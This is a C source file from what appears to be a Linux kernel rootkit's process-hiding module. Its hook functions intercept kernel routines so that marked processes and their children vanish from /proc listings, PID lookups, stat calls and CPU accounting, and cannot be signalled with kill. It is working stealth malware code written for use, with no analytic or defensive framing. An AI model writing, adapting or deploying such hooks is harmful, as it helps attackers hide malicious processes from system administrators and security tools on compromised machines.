#ifdef CONFIG_HIDE_PROCESS
#include "process.h"
#include "utils.h"

int (*orig_copy_creds)(struct task_struct *p, unsigned long clone_flags);
int rk_copy_creds(struct task_struct *p, unsigned long clone_flags)
{
	int ret = 0;
	ret = orig_copy_creds(p, clone_flags); // return 0 if OK
    // if current is hidden and this is call, it means that it forks another child and we should set it flags to hidden
	if (!ret && is_task_invisible(current))
		p->flags |= FLAG;

	return ret;
}


void (*orig_exit_creds)(struct task_struct *tsk);
void rk_exit_creds(struct task_struct *tsk)
{
	orig_exit_creds(tsk);
    //simply removes hidden flags if exists
	if (is_task_invisible(tsk))
		tsk->flags &= ~FLAG;
}

struct task_struct *(*orig_find_task_by_vpid)(pid_t vnr);
struct task_struct *rk_find_task_by_vpid(pid_t vnr)
{
	struct task_struct *tsk = NULL;
	//printk(KERN_DEBUG "FIND BY VPID : %d HETE bytes\n",vnr);
	tsk = orig_find_task_by_vpid(vnr);
    // if the requested pid is hidden and the process that request it is not hidden return null
	if (tsk && is_task_invisible(tsk) && !is_task_invisible(current))
		tsk = NULL;

	return tsk;
}

static int (*orig_vfs_statx)(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask);
static int rk_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask)
{
	if (is_proc_invisible_2(filename))
		return -EINVAL;

	return orig_vfs_statx(dfd, filename, flags, stat, request_mask);
}


// wrapped by vfs_statx , hook this instead of vfstax is accurate since most of vfstat like functions use it
int (*orig_vfs_getattr)(const struct path *path, struct kstat *stat, u32 request_mask, unsigned int query_flags);
int rk_vfs_getattr(const struct path *path, struct kstat *stat, u32 request_mask, unsigned int query_flags)
{
	if (is_proc_invisible_2(path->dentry->d_name.name))
		return -EINVAL;

	return orig_vfs_getattr(path, stat, request_mask, query_flags);
}

static asmlinkage long (*orig___x64_sys_kill)(const struct pt_regs *regs);
static asmlinkage long rk___x64_sys_kill(const struct pt_regs *regs) {
	if (is_proc_invisible(regs->di)) {
		return -ESRCH;
	}
    
	return orig___x64_sys_kill(regs);
}

// filter out /proc/PID like directory entries. skip all the tasks with hidden
static struct tgid_iter (*orig_next_tgid)(struct pid_namespace *ns, struct tgid_iter iter);
static struct tgid_iter rk_next_tgid(struct pid_namespace *ns, struct tgid_iter iter)
{
	if (hidden) {
		while ((iter = orig_next_tgid(ns, iter), iter.task) != NULL) {
			if ( !(iter.task->flags & FLAG) )
				break;
			iter.tgid++;
		}
	} else {
		iter = orig_next_tgid(ns, iter);
	}
	return iter;
}

// not account hidden process into cpu usage
void (*orig_account_process_tick)(struct task_struct *p, int user_tick) ;
void rk_account_process_tick(struct task_struct *p, int user_tick) {
	if (!is_task_invisible(p))
		orig_account_process_tick(p, user_tick);
}

#endif